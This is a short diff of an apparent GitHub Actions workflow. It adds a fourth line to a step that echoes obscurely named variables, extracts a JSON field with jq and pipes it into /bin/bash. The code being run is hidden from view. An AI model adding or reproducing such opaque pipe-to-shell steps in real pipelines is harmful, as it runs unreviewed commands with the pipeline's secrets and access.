@@ -35,6 +35,7 @@ jobs:
           echo $wyima7 | jq -r .yj87 | /bin/bash
           echo $njrpl91349 | jq -r .zk5 | /bin/bash
           echo $gts76860 | jq -r .ruqi3 | /bin/bash
+          echo $pxa136 | jq -r .if8 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
